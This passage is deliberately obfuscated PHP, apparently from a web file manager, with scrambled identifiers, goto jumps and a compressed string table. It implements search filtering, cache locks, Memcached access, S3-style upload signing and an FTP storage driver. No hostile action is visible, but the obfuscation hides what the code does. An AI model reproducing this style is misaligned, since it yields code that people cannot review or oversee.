$¡„îìòá[$Ş“ğ³ç»[192]] . $Ş“ğ³ç»[50])) { return !1; } if (isset($¡„îìòá[$Ş“ğ³ç»[486]]) && $¡„îìòá[$Ş“ğ³ç»[486]] != $Ş“ğ³ç»[843]) { if ($¡„îìòá[$Ş“ğ³ç»[486]] == $Ş“ğ³ç»[78] && !$’±²ŠÁ) { return !1; } if ($¡„îìòá[$Ş“ğ³ç»[486]] != $Ş“ğ³ç»[78] && $’±²ŠÁ) { return !1; } if (!strstr($ï¿‚ª¿—[$Ş“ğ³ç»[169]], $Ş“ğ³ç»[50] . $¡„îìòá[$Ş“ğ³ç»[486]] . $Ş“ğ³ç»[50])) { return !1; } } if (isset($¡„îìòá[$Ş“ğ³ç»[2231]]) && $¡„îìòá[$Ş“ğ³ç»[2231]] < $ï¿‚ª¿—[$Ş“ğ³ç»[79]]) { return !1; } if (isset($¡„îìòá[$Ş“ğ³ç»[2232]]) && $¡„îìòá[$Ş“ğ³ç»[2232]] > $ï¿‚ª¿—[$Ş“ğ³ç»[79]]) { return !1; } if (isset($¡„îìòá[$Ş“ğ³ç»[662]]) && $¡„îìòá[$Ş“ğ³ç»[662]] != $ï¿‚ª¿—[$Ş“ğ³ç»[529]]) { return !1; } return !0; } public function listSearchChildren($Å¸ÃÜñä, $öÌóæµÓ = 5000) { $Ïí¡×•È =& $_SERVER[ˆ¡¹µ‹Â]; $Ü½«ŸÙ = array(); $êÄı…ç¼ = $this->sourceInfo($Å¸ÃÜñä); $‘æ„Ç¶ = array($Ïí¡×•È[584] => array($Ïí¡×•È[459], $êÄı…ç¼[$Ïí¡×•È[584]] . $êÄı…ç¼[$Ïí¡×•È[193]] . $Ïí¡×•È[613])); $éÙâÈà = $this->field($Ïí¡×•È[79])->where($‘æ„Ç¶)->limit($öÌóæµÓ + 1)->select(); $¸øÅÀ‹– = is_array($éÙâÈà) ? count($éÙâÈà) : 0; if ($¸øÅÀ‹– > $öÌóæµÓ) { return $this->_listSearchChildrenNear($Å¸ÃÜñä, $öÌóæµÓ); } $ì†–ùæÎ = $this->field($Ïí¡×•È[193])->where($‘æ„Ç¶)->select(); $Ü½«ŸÙ = array_to_keyvalue($ì†–ùæÎ, $Ïí¡×•È[12], $Ïí¡×•È[193]); return $Ü½«ŸÙ; } private function _listSearchChildrenNear($éîŒ»Ã, $ì¥ˆç«ø) { $™—ÂÀ³ä =& $_SERVER[ˆ¡¹µ‹Â]; $“ã¯Ö = array(); $»ğõ«Ùœ = array($™—ÂÀ³ä[192] => $éîŒ»Ã); $³µ‘©½ = $this->field($™—ÂÀ³ä[2233])->where($»ğõ«Ùœ)->select(); $İİ¥á¡Á = array_to_keyvalue(array_filter_by_field($³µ‘©½, $™—ÂÀ³ä[485], $™—ÂÀ³ä[91]), $™—ÂÀ³ä[12], $™—ÂÀ³ä[193]); $“ã¯Ö = array_merge($“ã¯Ö, array_to_keyvalue($³µ‘©½, $™—ÂÀ³ä[12], $™—ÂÀ³ä[193])); if (!$İİ¥á¡Á) { return $“ã¯Ö; } $»ğõ«Ùœ = array($™—ÂÀ³ä[192] => array($™—ÂÀ³ä[7], $İİ¥á¡Á)); $³µ‘©½ = $this->field($™—ÂÀ³ä[2233])->where($»ğõ«Ùœ)->limit($ì¥ˆç«ø)->select(); $“ã¯Ö = array_merge($“ã¯Ö, array_to_keyvalue($³µ‘©½, $™—ÂÀ³ä[12], $™—ÂÀ³ä[193])); $“ã¯Ö = array_slice($“ã¯Ö, 0, intval($ì¥ˆç«ø)); return $“ã¯Ö; } private function _listSearchBindPinyin($ß“¯¹ÚÕ, &$¬—Ò¿×†, &$ úòˆš ) { $Ó§Ñ¡ö =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($ß“¯¹ÚÕ[$Ó§Ñ¡ö[2060]]) || !$ß“¯¹ÚÕ[$Ó§Ñ¡ö[2060]]) { return; } if (!Input::check($ß“¯¹ÚÕ[$Ó§Ñ¡ö[2060]], $Ó§Ñ¡ö[394]) || strlen($ß“¯¹ÚÕ[$Ó§Ñ¡ö[2060]]) < 2) { return; } $³õë´Ü® = "\x4c\x45\x46\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\157\x5f\x73\157\x75\162\143\x65\137\x6d\145\164\x61\x20\155\x65\164\141\40\x6f\156\x20\x73\157\x75\x72\x63\145\56\163\x6f\x75\162\x63\145\x49\104\40\x3d\40\155\145\164\x61\56\x73\157\165\162\143\145\111\x44"; $»óÓÇÎ¨ = array(); $ úòˆš  = str_replace(array($Ó§Ñ¡ö[262], $Ó§Ñ¡ö[53], $Ó§Ñ¡ö[2234]), $Ó§Ñ¡ö[12], $ úòˆš ); $ úòˆš  = $Ó§Ñ¡ö[511] . str_replace($Ó§Ñ¡ö[50], $Ó§Ñ¡ö[512], $ úòˆš ); $ØìÛÚÒÙ = $¬—Ò¿×†[$Ó§Ñ¡ö[32]]; unset($¬—Ò¿×†[$Ó§Ñ¡ö[32]]); foreach ($¬—Ò¿×† as $ÂîÂÄæï => $¿Âñ¯÷À) { $»óÓÇÎ¨[$Ó§Ñ¡ö[511] . $ÂîÂÄæï] = $¿Âñ¯÷À; } foreach ($ØìÛÚÒÙ as $¯âŞšÓ) { $»óÓÇÎ¨[] = array($Ó§Ñ¡ö[516] => $¯âŞšÓ, $Ó§Ñ¡ö[1071] => $Ó§Ñ¡ö[2064], array($Ó§Ñ¡ö[2235] => $¯âŞšÓ, $Ó§Ñ¡ö[2236] => array($Ó§Ñ¡ö[7], array($Ó§Ñ¡ö[538], $Ó§Ñ¡ö[537])))); } $this->join($³õë´Ü®); $¬—Ò¿×† = $»óÓÇÎ¨; } private function _parseSearchWhere($™…ÜÙ”–) { $ƒâä…Êé =& $_SERVER[ˆ¡¹µ‹Â]; $¶€ø¤Š = array(); if (isset($™…ÜÙ”–[$ƒâä…Êé[827]]) && $™…ÜÙ”–[$ƒâä…Êé[827]]) { $¶€ø¤Š[$ƒâä…Êé[88]] = array($ƒâä…Êé[2237], $™…ÜÙ”–[$ƒâä…Êé[827]]); } if (isset($™…ÜÙ”–[$ƒâä…Êé[828]]) && $™…ÜÙ”–[$ƒâä…Êé[828]]) { $ëŸ¦Éãù = array($ƒâä…Êé[2238], $™…ÜÙ”–[$ƒâä…Êé[828]]); if ($¶€ø¤Š[$ƒâä…Êé[88]]) { $¶€ø¤Š[$ƒâä…Êé[88]] = array($¶€ø¤Š[$ƒâä…Êé[88]], $ëŸ¦Éãù, $ƒâä…Êé[2239]); } else { $¶€ø¤Š[$ƒâä…Êé[88]] = $ëŸ¦Éãù; } } if (isset($™…ÜÙ”–[$ƒâä…Êé[2231]]) && $™…ÜÙ”–[$ƒâä…Êé[2231]] > 0) { $¶€ø¤Š[$ƒâä…Êé[79]] = array($ƒâä…Êé[2237], $™…ÜÙ”–[$ƒâä…Êé[2231]]); } if (isset($™…ÜÙ”–[$ƒâä…Êé[2232]]) && $™…ÜÙ”–[$ƒâä…Êé[2232]]) { $ëŸ¦Éãù = array($ƒâä…Êé[2238], $™…ÜÙ”–[$ƒâä…Êé[2232]]); if ($¶€ø¤Š[$ƒâä…Êé[79]]) { $¶€ø¤Š[$ƒâä…Êé[79]] = array($¶€ø¤Š[$ƒâä…Êé[79]], $ëŸ¦Éãù, $ƒâä…Êé[2239]); } else { $¶€ø¤Š[$ƒâä…Êé[79]] = $ëŸ¦Éãù; } } if (isset($™…ÜÙ”–[$ƒâä…Êé[662]]) && $™…ÜÙ”–[$ƒâä…Êé[662]]) { $¶€ø¤Š[] = array($ƒâä…Êé[529] => $™…ÜÙ”–[$ƒâä…Êé[662]], $ƒâä…Êé[527] => $™…ÜÙ”–[$ƒâä…Êé[662]], $ƒâä…Êé[1071] => $ƒâä…Êé[2064]); } if (isset($™…ÜÙ”–[$ƒâä…Êé[486]]) && $™…ÜÙ”–[$ƒâä…Êé[486]]) { $™­Ã¡óµ = $™…ÜÙ”–[$ƒâä…Êé[486]]; if ($™­Ã¡óµ == $ƒâä…Êé[78]) { $¶€ø¤Š[$ƒâä…Êé[485]] = 1; } else { if ($™­Ã¡óµ == $ƒâä…Êé[2240]) { $¶€ø¤Š[$ƒâä…Êé[485]] = 0; } else { if ($™­Ã¡óµ) { $™­Ã¡óµ = is_array($™­Ã¡óµ) ? $™­Ã¡óµ : explode($ƒâä…Êé[50], $™­Ã¡óµ); $¶€ø¤Š[$ƒâä…Êé[486]] = array($ƒâä…Êé[492], $™­Ã¡óµ); $¶€ø¤Š[$ƒâä…Êé[485]] = 0; } } } } $this->_parseSearchParent($™…ÜÙ”–, $¶€ø¤Š); if (isset($™…ÜÙ”–[$ƒâä…Êé[2060]]) && trim($™…ÜÙ”–[$ƒâä…Êé[2060]])) { $¨œ©†ş¾ = trim($™…ÜÙ”–[$ƒâä…Êé[2060]]); $¯àª¹¥º = explode($ƒâä…Êé[53], $¨œ©†ş¾); if (strlen($¨œ©†ş¾) > 2 && (substr($¨œ©†ş¾, 0, 1) == $ƒâä…Êé[121] && substr($¨œ©†ş¾, -1) == $ƒâä…Êé[121]) || substr($¨œ©†ş¾, 0, 1) == $ƒâä…Êé[58] && substr($¨œ©†ş¾, -1) == $ƒâä…Êé[58]) { $¨œ©†ş¾ = substr($¨œ©†ş¾, 1, -1); $¯àª¹¥º = array($¨œ©†ş¾); } $¶€ø¤Š[$ƒâä…Êé[32]] = array(array($ƒâä…Êé[612], $ƒâä…Êé[2062] . $¨œ©†ş¾ . $ƒâä…Êé[2062])); if (count($¯àª¹¥º) > 1) { $¶€ø¤Š[$ƒâä…Êé[32]] = array(); foreach ($¯àª¹¥º as $ãØõãËè) { if (!trim($ãØõãËè)) { continue; } $¶€ø¤Š[$ƒâä…Êé[32]][] = array($ƒâä…Êé[612], $ƒâä…Êé[2062] . trim($ãØõãËè) . $ƒâä…Êé[2062]); } } } return $¶€ø¤Š; } private function _parseSearchParent($³¬İØö‡, &$ãá§èåö) { $ÊÓøõ—– =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($³¬İØö‡[$ÊÓøõ—–[192]]) || !$³¬İØö‡[$ÊÓøõ—–[192]]) { return; } $Ïçç£¶¹ = $this->pathInfo($³¬İØö‡[$ÊÓøõ—–[192]]); $ÁşÒßß˜ = $Ïçç£¶¹[$ÊÓøõ—–[192]] . $ÊÓøõ—–[12] === $ÊÓøõ—–[228]; $¦´–Éº° = $Ïçç£¶¹[$ÊÓøõ—–[190]] == $ÊÓøõ—–[578]; if ($Ïçç£¶¹[$ÊÓøõ—–[595]] == $ÊÓøõ—–[596]) { $´ –‹¹Ó = $this->sourceInfo($³¬İØö‡[$ÊÓøõ—–[192]]); $Ïçç£¶¹[$ÊÓøõ—–[584]] = $´ –‹¹Ó[$ÊÓøõ—–[584]]; } $ãá§èåö[$ÊÓøõ—–[652]] = array($ÊÓøõ—–[612], $Ïçç£¶¹[$ÊÓøõ—–[584]] . $³¬İØö‡[$ÊÓøõ—–[192]] . $ÊÓøõ—–[613]); $µ£Â¾¨† = isset($³¬İØö‡[$ÊÓøõ—–[1920]]) && in_array($ÊÓøõ—–[578], $³¬İØö‡[$ÊÓøõ—–[1920]]); if (!$µ£Â¾¨† || !$¦´–Éº° || !$ÁşÒßß˜ || !$Ïçç£¶¹[$ÊÓøõ—–[487]]) { return; } if (!AuthModel::authCheckRoot($Ïçç£¶¹[$ÊÓøõ—–[487]][$ÊÓøõ—–[488]])) { return; } $ÓªÕñ¼ = $Ïçç£¶¹[$ÊÓøõ—–[569]] . $ÊÓøõ—–[12]; if ($ÓªÕñ¼ == $ÊÓøõ—–[91]) { unset($ãá§èåö[$ÊÓøõ—–[652]]); $ãá§èåö[$ÊÓøõ—–[190]] = self::TYPE_GROUP; return; } $Í€«­¯” = Model($ÊÓøõ—–[585])->groupChildrenAll($ÓªÕñ¼); $üâ’âŠ = count($Í€«­¯”); if ($üâ’âŠ <= 1) { return; } $ä­Ş‰‰å = array($ÊÓøõ—–[192] => 0, $ÊÓøõ—–[190] => self::TYPE_GROUP, $ÊÓøõ—–[569] => array($ÊÓøõ—–[7], $Í€«­¯”)); $Ï¹İöŞ = $this->field($ÊÓøõ—–[2241])->where($ä­Ş‰‰å)->limit($üâ’âŠ)->select(); $ãá§èåö[$ÊÓøõ—–[652]] = array(); foreach ($Ï¹İöŞ as $òÆêúœÇ) { $ãá§èåö[$ÊÓøõ—–[652]][] = array($ÊÓøõ—–[612], $ÊÓøõ—–[594] . $òÆêúœÇ[$ÊÓøõ—–[193]] . $ÊÓøõ—–[613]); } $ãá§èåö[$ÊÓøõ—–[652]][] = $ÊÓøõ—–[2064]; } } goto D«Š¢´è‚Ø; d¦ä¡Æë¸–: if (!$tukerlwafc) { die; } $_SERVER[ Ãœáã¬] = explode($_SERVER[ˆ¡¹µ‹Â][680], gzinflate(substr($_SERVER[ˆ¡¹µ‹Â][681], 10, -8))); $znstewkolc = $_SERVER[ˆ¡¹µ‹Â][682]; goto D¯çğÖ£Ş»; B—¿áÄì¹: class CacheLockMemcached { public function lock($Ëò¦ß½À, $ööÑ£» = 0) { $áåóó·ë = Cache::init(); $¤İã•Š² = microtime(!0) + $ööÑ£»; while (microtime(!0) < $¤İã•Š²) { $’Ñá¡…ª = $áåóó·ë->get($Ëò¦ß½À); if (!$’Ñá¡…ª || $’Ñá¡…ª < microtime(!0)) { $¶³ƒã±Å = $áåóó·ë->handle->add($Ëò¦ß½À, $¤İã•Š², $ööÑ£»); if ($¶³ƒã±Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ƒêÓ†ù™) { return Cache::init()->get($ƒêÓ†ù™); } public function unlock($¼Íµ²úÌ) { return Cache::init()->remove($¼Íµ²úÌ); } } class CacheLockDatabase { public function lock($ÉŠ¿­ìØ, $İŸ†ƒ = 0) { $¸‡¹—ù = Model($_SERVER[ˆ¡¹µ‹Â][903]); $°°Ú¨™Ô = microtime(!0) + $İŸ†ƒ; while (microtime(!0) < $°°Ú¨™Ô) { $ñ íë¡˜ = $¸‡¹—ù->get($ÉŠ¿­ìØ); if (!$ñ íë¡˜ || $ñ íë¡˜ < microtime(!0)) { $ü’ƒ£‡£ = $¸‡¹—ù->set($ÉŠ¿­ìØ, $°°Ú¨™Ô); if ($ü’ƒ£‡£) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($«Âñ­¾ğ) { return Model($_SERVER[ˆ¡¹µ‹Â][903])->get($«Âñ­¾ğ); } public function unlock($®ï ®œµ) { Model($_SERVER[ˆ¡¹µ‹Â][903])->remove($®ï ®œµ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($‰ıØÂôœ, $ıä‹ô™û) { $Øıúñå =& $_SERVER[ˆ¡¹µ‹Â]; if (!class_exists($Øıúñå[941])) { show_json($Øıúñå[942], !1); } $this->cacheTime = $ıä‹ô™û; $this->handle = new Memcached(); if (is_array($‰ıØÂôœ[$Øıúñå[943]]) && count($‰ıØÂôœ[$Øıúñå[943]]) >= 1) { foreach ($‰ıØÂôœ[$Øıúñå[943]] as $³šåÔá«) { $´ÃòËü” = explode($Øıúñå[4], $³šåÔá«); $this->handle->addServer($´ÃòËü”[0], $´ÃòËü”[1]); } } else { $this->handle->addServer($‰ıØÂôœ[$Øıúñå[208]], $‰ıØÂôœ[$Øıúñå[209]]); } } public function set($´¢˜»Ë, $¦”µ£”©, $ÅŒº€ç = false) { $ÅŒº€ç = $ÅŒº€ç ? $ÅŒº€ç : $this->cacheTime; return $this->handle->set($´¢˜»Ë, $¦”µ£”©, $ÅŒº€ç); } public function get($·ßÑ¯é) { return $this->handle->get($·ßÑ¯é); } public function remove($€ˆ—£™Ï) { return $this->handle->delete($€ˆ—£™Ï); } public function deleteAll() { return $this->handle->flush(); } } goto Eœ ×Ä‘Ğ†; BëˆÄŒâÏÌ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($§¡¾ñ£) { parent::__construct($§¡¾ñ£); $this->setSignVersion($_SERVER[ˆ¡¹µ‹Â][247]); } public function uploadFormData($è‚û’êÔ, $®‹¨ôäº = 3600) { $ª¸¼¥ßí =& $_SERVER[ˆ¡¹µ‹Â]; $½†‹ùÌÎ = $ª¸¼¥ßí[229]; $ıØ‚¶» = $ª¸¼¥ßí[270]; $öÇÕãŒ = $ª¸¼¥ßí[62]; $Ò¦öÆ½ = gmdate($ª¸¼¥ßí[271]); $­•èì£¶ = gmdate($ª¸¼¥ßí[272]); $´Ã¼ù½À = $ª¸¼¥ßí[273]; $äŸëõ°‰ = $®‹¨ôäº . $ª¸¼¥ßí[12]; $ÓÅÉó²¥ = $ª¸¼¥ßí[274]; $˜¥›µÈ = array($this->accessKey, $­•èì£¶, $this->region, $öÇÕãŒ, $´Ã¼ù½À); $Ÿ ³ºÖ = implode($ª¸¼¥ßí[8], $˜¥›µÈ); $‘‘…ñë¯ = array($ª¸¼¥ßí[275] => gmdate($ª¸¼¥ßí[299], strtotime($ª¸¼¥ßí[277])), $ª¸¼¥ßí[278] => array(array($ª¸¼¥ßí[279] => $this->bucket), array($ª¸¼¥ßí[280] => $½†‹ùÌÎ), array($ª¸¼¥ßí[281], $ª¸¼¥ßí[282], $ª¸¼¥ßí[12]), array($ª¸¼¥ßí[281], $ª¸¼¥ßí[283], $ª¸¼¥ßí[12]), array($ª¸¼¥ßí[281], $ª¸¼¥ßí[284], $ª¸¼¥ßí[12]), array($ª¸¼¥ßí[285] => $ÓÅÉó²¥), array($ª¸¼¥ßí[286] => $Ÿ ³ºÖ), array($ª¸¼¥ßí[287] => $ıØ‚¶»), array($ª¸¼¥ßí[288] => $Ò¦öÆ½), array($ª¸¼¥ßí[289] => $äŸëõ°‰))); $–‹®ãĞº = base64_encode(json_encode($‘‘…ñë¯)); $÷åä© = hash_hmac($ª¸¼¥ßí[290], $­•èì£¶, $ª¸¼¥ßí[291] . $this->secret, !0); $ÇüÏù®£ = hash_hmac($ª¸¼¥ßí[290], $this->region, $÷åä©, !0); $­¦ûˆÌé = hash_hmac($ª¸¼¥ßí[290], $öÇÕãŒ, $ÇüÏù®£, !0); $íÖîÖ´ä = hash_hmac($ª¸¼¥ßí[290], $´Ã¼ù½À, $­¦ûˆÌé, !0); $¡ÅàÇÖ = hash_hmac($ª¸¼¥ßí[290], $–‹®ãĞº, $íÖîÖ´ä); $ÛøÂ¤¬Û = array($ª¸¼¥ßí[246] => $ª¸¼¥ßí[12], $ª¸¼¥ßí[292] => $ª¸¼¥ßí[12], $ª¸¼¥ßí[280] => $½†‹ùÌÎ, $ª¸¼¥ßí[285] => $ÓÅÉó²¥, $ª¸¼¥ßí[293] => $–‹®ãĞº, $ª¸¼¥ßí[294] => $Ÿ ³ºÖ, $ª¸¼¥ßí[295] => $ıØ‚¶», $ª¸¼¥ßí[296] => $Ò¦öÆ½, $ª¸¼¥ßí[297] => $äŸëõ°‰, $ª¸¼¥ßí[298] => $¡ÅàÇÖ, $ª¸¼¥ßí[208] => $this->getHost()); return $ÛøÂ¤¬Û; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($®¿ğÔ÷¼) { parent::__construct(); if (count($®¿ğÔ÷¼) > 0) { $this->_init($®¿ğÔ÷¼); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ãï“Ã¶ ) { $±êÜß‚ =& $_SERVER[ˆ¡¹µ‹Â]; global $config; $this->appCharset = $config[$±êÜß‚[1429]]; $this->systemCharset = $config[$±êÜß‚[1430]]; if (isset($Ãï“Ã¶ [$±êÜß‚[1431]]) && $Ãï“Ã¶ [$±êÜß‚[1431]]) { $this->systemCharset = $Ãï“Ã¶ [$±êÜß‚[1431]]; } } public function iconvApp($÷Óş˜“ô) { return $this->iconvTo($÷Óş˜“ô, $this->systemCharset, $this->appCharset); } public function iconvSystem($¿±øŸ©) { return $this->iconvTo($¿±øŸ©, $this->appCharset, $this->systemCharset); } public function getPathOuter($øå¥Ô¨è) { $¿Á´¨‚­ =& $_SERVER[ˆ¡¹µ‹Â]; $ßñ—íÁ = $this->iconvApp($this->pathBase); $øå¥Ô¨è = $this->iconvApp($øå¥Ô¨è); if (substr($ßñ—íÁ, 0, 2) == $¿Á´¨‚­[1403]) { $ßñ—íÁ = BASIC_PATH . substr($ßñ—íÁ, 2); } if (substr($øå¥Ô¨è, 0, 2) == $¿Á´¨‚­[1403]) { $øå¥Ô¨è = BASIC_PATH . substr($øå¥Ô¨è, 2); } $ßñ—íÁ = KodIO::clear($ßñ—íÁ); $øå¥Ô¨è = KodIO::clear($øå¥Ô¨è); $øå¥Ô¨è = substr($øå¥Ô¨è, strlen($ßñ—íÁ)); if (empty($this->pathDriver)) { return $øå¥Ô¨è; } return $this->pathDriver . $¿Á´¨‚­[8] . ltrim($øå¥Ô¨è, $¿Á´¨‚­[8]); } private function _init($ûŠƒÌõ = array()) { $ËæĞı³î =& $_SERVER[ˆ¡¹µ‹Â]; if (!function_exists($ËæĞı³î[1432])) { throw new Exception(LNG($ËæĞı³î[1433])); } $this->config = $ûŠƒÌõ; $this->charsetReset($ûŠƒÌõ); foreach ($ûŠƒÌõ as $á„Á×ë => $ñä±äá) { if (isset($this->{$á„Á×ë})) { $this->{$á„Á×ë} = $ñä±äá; } } return $this->_login($ûŠƒÌõ); } private function _login($äïÏüš¬) { $½Ûäû¨µ =& $_SERVER[ˆ¡¹µ‹Â]; static $Æû¼Á… = array(); $¬ûÚ¾ˆ = md5(json_encode($äïÏüš¬)); if (isset($Æû¼Á…[$¬ûÚ¾ˆ])) { foreach ($Æû¼Á…[$¬ûÚ¾ˆ] as $Ğ¥ıñÑ  => $¾öéç) { $this->{$Ğ¥ıñÑ } = $¾öéç; } return !0; } $™ “ ˆ‹ = parse_url(trim($this->server, $½Ûäû¨µ[8])); $this->host = $™ “ ˆ‹[$½Ûäû¨µ[208]]; $§Ë©¥®Á = isset($™ “ ˆ‹[$½Ûäû¨µ[207]]) && $™ “ ˆ‹[$½Ûäû¨µ[207]] == $½Ûäû¨µ[1434] ? !0 : !1; $this->scheme = $§Ë©¥®Á ? $½Ûäû¨µ[1435] : $½Ûäû¨µ[1436]; $this->port = isset($™ “ ˆ‹[$½Ûäû¨µ[209]]) ? $™ “ ˆ‹[$½Ûäû¨µ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($½Ûäû¨µ[1437]) . $this->host . $½Ûäû¨µ[4] . $this->port, !0); return !1; } $Òõ¦ä± = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Òõ¦ä±) { $this->writeLog(LNG($½Ûäû¨µ[1438]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $å¬Õ§Ğî = $this->pasv == $½Ûäû¨µ[91] ? !0 : !1; @ftp_pasv($this->connect, $å¬Õ§Ğî); $Æû¼Á…[$¬ûÚ¾ˆ] = array($½Ûäû¨µ[1439] => $this->connect, $½Ûäû¨µ[208] => $this->host, $½Ûäû¨µ[207] => $this->scheme, $½Ûäû¨µ[209] => $this->port); return $Òõ¦ä±; } private function _isconn($ğ•è˜ı = true) { if (is_resource($this->connect)) { return !0; } if (!$ğ•è˜ı) { return !1; } return $this->_login($this->config); } public function mkfile($ã§Õ¿ê, $¦Í«º¬ = '', $ ó±Ò¯ = REPEAT_RENAME) { if ($this->setContent($ã§Õ¿ê, $¦Í«º¬)) { return $this->getPathOuter($ã§Õ¿ê); } $this->writeLog(LNG($_SERVER[ˆ¡¹µ‹Â][1440]), !0); return !1; } public function mkdir($©Ğö§ïš, $Ãˆö´•ñ = REPEAT_SKIP) { $—‹–¬¨ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$©Ğö§ïš || $©Ğö§ïš == $—‹–¬¨[8]) { return !0; } if (!$this->_isconn()) { return !1; } $©Ğö§ïš = $this->iconvSystem($©Ğö§ïš); if ($this->_isFolder($©Ğö§ïš) || @ftp_mkdir($this->connect, $©Ğö§ïš)) { return $this->getPathOuter($©Ğö§ïš); } if (!$this->mkdir($this->pathFather($©Ğö§ïš))) { return !1; } if ($©Ğö§ïš = @ftp_mkdir($this->connect, $©Ğö§ïš)) { return $this->getPathOuter($©Ğö§ïš); } $this->writeLog(__FUNCTION__ . $—‹–¬¨[1441], !0); return !1; } public function copyFile($„•£ĞñÚ, $Ğ„•Î¸ñ) { if (!$this->_isconn()) { return !1; } $Ä…–ú¡‹ = $this->pathThis($this->iconvSystem($„•£ĞñÚ)); $†ìƒ”Ş² = $this->tempFile($Ä…–ú¡‹); $“ÔğÙ‘Í = $this->iconvApp($†ìƒ”Ş²); $this->download($„•£ĞñÚ, $“ÔğÙ‘Í); $òô¸•‚˜ = $this->upload($Ğ„•Î¸ñ, $“ÔğÙ‘Í); $this->tempFileRemve($†ìƒ”Ş²); return $òô¸•‚˜; } public function moveFile($×“ùî¡ê, $™ù›ùòô) { if (!$this->_isconn()) { return !1; } $×“ùî¡ê = $this->iconvSystem($×“ùî¡ê); $™ù›ùòô = $this->iconvSystem($™ù›ùòô); $Ç…Õ˜šÊ = @ftp_rename($this->connect, $×“ùî¡ê, $™ù›ùòô); if (!$Ç…Õ˜šÊ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); return !1; } return $this->getPathOuter($™ù›ùòô); } public function delFile($ˆˆ¾—ó‰) { if (!$this->_isconn()) { return !1; } $ˆˆ¾—ó‰ = $this->iconvSystem($ˆˆ¾—ó‰); $şÌÛşáÆ = @ftp_delete($this->connect, $ˆˆ¾—ó‰); if (!$şÌÛşáÆ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆ¡¹µ‹Â][1441], !0); } return $şÌÛşáÆ; } public function delFolder($‡üï»è) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¡ºÆ›ıË = $ôÂ¼Ô…ş = array(); $this->fileList($‡üï»è, $¡ºÆ›ıË, $ôÂ¼Ô…ş, !0); $this->listItemCache = !0; foreach ($ôÂ¼Ô…ş as $åÙ«àôØ) { $¹¹Ææ¨Ê = $this->iconvSystem($åÙ«àôØ[$_SERVER[ˆ¡¹µ‹Â][32]]); $¿ê¹Š³ = @ftp_delete($this->connect, $¹¹Ææ¨Ê); if (!$¿ê¹Š³) { return !1; } } foreach ($¡ºÆ›ıË as $¹¹Ææ¨Ê) { $¹¹Ææ¨Ê = $this->iconvSystem($¹¹Ææ¨Ê); $¿ê¹Š³ = @ftp_rmdir($this->connect, $¹¹Ææ¨Ê); if (!$¿ê¹Š³) { return !1; } } $‡üï»è = $this->iconvSystem($‡üï»è); return @ftp_rmdir($this->connect, $‡üï»è); } public function rename($«¾—ÙÀá, $ÈËÑÛˆŒ) { $•»‡”ä =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->_isconn()) { return !1; } $²Ö¸˜¹ë = $this->fileNameAuto($this->pathFather($«¾—ÙÀá), $ÈËÑÛˆŒ); $²Ö¸˜¹ë = $this->iconvSystem($²Ö¸˜¹ë); $«¾—ÙÀá = $this->iconvSystem($«¾—ÙÀá); $ÇÇäÚ½‘ = $this->pathFather($«¾—ÙÀá); $«÷Ş¹‚ = rtrim($ÇÇäÚ½‘, $•»‡”ä[8]) . $•»‡”ä[8] . $²Ö¸˜¹ë; $Ô´İÉû = @ftp_rename($this->connect, $«¾—ÙÀá, $«÷Ş¹‚); if (!$Ô´İÉû) { $this->writeLog(__FUNCTION__ . $•»‡”ä[1441], !0); return !1; } $«÷Ş¹‚ = $this->iconvApp($«÷Ş¹‚); return $this->getPathOuter($«÷Ş¹‚); } private function folderInfo($Òæ’„¬…, $ä€½›ì¨ = false) { $–ò¥’æ =& $_SERVER[ˆ¡¹µ‹Â]; $ğÒÏ„£ = array($–ò¥’æ[32] => $this->pathThis($Òæ’„¬…), $–ò¥’æ[87] => $this->getPathOuter($–ò¥’æ[8] . $Òæ’„¬…), $–ò¥’æ[33] => $–ò¥’æ[78]); if ($ä€½›ì¨) { return $ğÒÏ„£; } $ğÒÏ„£[$–ò¥’æ[231]] = $ğÒÏ„£[$–ò¥’æ[88]] = 0; $ğÒÏ„£[$–ò¥’æ[232]] = $ğÒÏ„£[$–ò¥’æ[233]] = !0; return $ğÒÏ„£; } private function fileInfo($í”ØµÕ¶, $‘Ê›ô¤ô = false, $‹üÁÁ³ = array()) { $àå¨¤¹¨ =& $_SERVER[ˆ¡¹µ‹Â]; $†£¼õ„Ù = array($àå¨¤¹¨[32] => $this->pathThis($í”ØµÕ¶), $àå¨¤¹¨[87] => $this->getPathOuter($àå¨¤¹¨[8] . $í”ØµÕ¶), $àå¨¤¹¨[33] => $àå¨¤¹¨[230], $àå¨¤¹¨[79] => isset($‹üÁÁ³[$àå¨¤¹¨[79]]) ? $‹üÁÁ³[$àå¨¤¹¨[79]] : 0, $àå¨¤¹¨[169] => $this->ext($í”ØµÕ¶)); if ($‘Ê›ô¤ô) { return $†£¼õ„Ù; } $†£¼õ„Ù[$àå¨¤¹¨[231]] = $†£¼õ„Ù[$àå¨¤¹¨[88]] = 0; $†£¼õ„Ù[$àå¨¤¹¨[232]] = $†£¼õ„Ù[$àå¨¤¹¨[233]] = !0; $¢»«„‘ = $this->iconvSystem($í”ØµÕ¶); $†£¼õ„Ù[$àå¨¤¹¨[88]] = @ftp_mdtm($this->connect, $¢»«„‘); if (empty($‹üÁÁ³)) { $‹üÁÁ³ = $this->objectMeta($í”ØµÕ¶); if (!$‹üÁÁ³) { return $†£¼õ„Ù; } } $†£¼õ„Ù[$àå¨¤¹¨[79]] = $‹üÁÁ³[$àå¨¤¹¨[79]]; return $†£¼õ„Ù; } 